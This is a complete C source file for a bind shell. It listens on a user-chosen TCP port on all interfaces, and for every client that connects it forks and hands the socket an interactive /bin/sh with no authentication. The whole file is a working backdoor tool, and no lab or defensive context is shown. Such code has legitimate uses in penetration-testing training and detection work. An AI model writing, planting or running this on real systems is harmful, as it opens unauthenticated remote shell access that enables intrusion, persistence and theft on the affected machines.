#include <arpa/inet.h>
#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static void usage(char *progname)
{
    fprintf(stderr, "usage: %s [-p server_port]\n", progname);
}

static int parse_args(int argc, char *argv[], in_port_t *server_port)
{
    int opt;

    while ((opt = getopt(argc, argv, "p:c:h")) != -1) {
        switch (opt) {
        case 'p':
            *server_port = htons(atoi(optarg));
            break;

        case 'h':
            return 1;
        }
    }

    if (!(*server_port))
        return 1;

    return 0;
}

void exec_shell(int client_fd)
{
    char *cmd[3] = { "/bin/sh", "-i", NULL };

    dup2(client_fd, 0);
    dup2(client_fd, 1);
    dup2(client_fd, 2);

    execv(cmd[0], cmd);
}

int main(int argc, char *argv[])
{
    int server_fd = 0;
    int client_fd = 0;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);

    memset(&server_addr, 0, sizeof(struct sockaddr_in));

    /* Parse the server port. */
    if (parse_args(argc, argv, &server_addr.sin_port)) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        fprintf(stderr, "fail to create the server socket.\n");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    /* Bind the server to specified port */
    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
        fprintf(stderr, "fail to bind the server to specified port\n");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 1) == -1) {
        fprintf(stderr, "fail to configure the server to listen new connections\n");
        exit(EXIT_FAILURE);
    }

    fprintf(stdout, "starting server...\n");

    while (1) {
        client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);

        if (client_fd > 0) {
            fprintf(stdout, "client %s connected\n", inet_ntoa(client_addr.sin_addr));

            if (!fork())
                exec_shell(client_fd);
        }
    }

    close(server_fd);

    exit(EXIT_SUCCESS);
}
